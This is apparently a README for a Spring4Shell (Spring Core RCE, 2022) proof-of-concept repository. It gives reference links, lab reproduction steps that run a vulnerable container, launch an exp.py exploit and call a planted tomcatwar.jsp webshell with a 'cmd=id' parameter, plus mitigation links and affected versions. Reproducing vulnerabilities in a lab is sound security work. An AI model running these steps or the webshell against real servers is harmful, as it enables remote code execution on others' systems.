# Information

https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement

https://www.rapid7.com/blog/post/2022/03/30/spring4shell-zero-day-vulnerability-in-spring-framework/?s=03

https://github.com/tweedge/springcore-0day-en

# How to reproduce
docker run -d -p 8082:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29

python3 ./exp.py --url http://192.168.0.11:8082

curl --output - "http://192.168.0.11:8082/tomcatwar.jsp?pwd=j&cmd=id"

![vulnerable code + poc](images/exploit.jpg)

# Mitigations
https://github.com/blindpirate/spring-rce-2022-03-hotfix (untested)

https://www.praetorian.com/blog/spring-core-jdk9-rce/

# Spring Core RCE

> After Spring Cloud, on 3.29, another major Spring vulnerability was reported online: Spring Core RCE

(Note from craig: Spring Cloud exploit here: https://github.com/hktalent/spring-spel-0day-poc)

## coded poc in circulation
** currently exp has been uploaded ``exp.py`` **
![circulating coded poc](images/poc.png)
![awkward situation](images/img_1.png)

## The official Spring patch is also in active production  
[Link to patches in production for Spring](https://github.com/spring-projects/spring-framework/commit/7f7fb58dd0dae86d22268a4b59ac7c72a6c22529)

## The vulnerability affects
1. jdk version 9 and above
2. using Spring Framework or derivative frameworks
## Vulnerability Fix Recommendations
Currently, Spring has not released a patch, so we recommend lowering the jdk version as a temporary solution.

Translated with www.DeepL.com/Translator (free version)
